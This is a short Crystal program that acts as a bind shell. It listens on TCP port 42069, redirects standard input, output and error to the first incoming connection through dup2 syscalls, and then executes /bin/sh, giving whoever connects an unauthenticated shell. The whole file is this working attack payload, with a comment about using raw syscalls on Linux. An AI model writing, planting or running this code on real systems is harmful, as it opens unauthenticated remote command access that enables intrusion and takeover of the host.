require "socket"
require "syscall"
require "process"

module YourSyscalls
  # this part only works on Linux while I work out how to do the dup2 bullshit natively, I cheated and used syscalls.
  Syscall.def_syscall dup2, Int32, oldfd : Int32, newfd : Int32
end
server = TCPServer.new(42069)
socket = server.accept
YourSyscalls.dup2(socket.fd, 0)
YourSyscalls.dup2(socket.fd, 1)
YourSyscalls.dup2(socket.fd, 2)
Process.exec("/bin/sh")
